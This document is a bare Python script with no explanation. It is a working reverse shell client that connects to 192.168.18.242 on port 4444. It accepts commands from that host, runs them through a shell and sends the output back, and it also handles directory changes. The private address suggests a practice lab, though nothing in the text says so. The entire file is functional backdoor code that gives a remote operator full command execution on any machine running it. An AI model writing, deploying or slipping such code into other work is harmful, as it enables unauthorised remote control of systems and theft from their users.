import socket
import json
import subprocess 
import os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.18.242',4444))
while True:
        command_recv = json.loads(s.recv(65000).decode())   
        if command_recv == 'quit':
                break
        elif command_recv[:3] == 'cd ':
                os.chdir(command_recv[3:])
                s.send(json.dumps('').encode())
        else:
                output = subprocess.check_output(command_recv, shell=True)
                s.send(json.dumps(output.decode()).encode())            


  
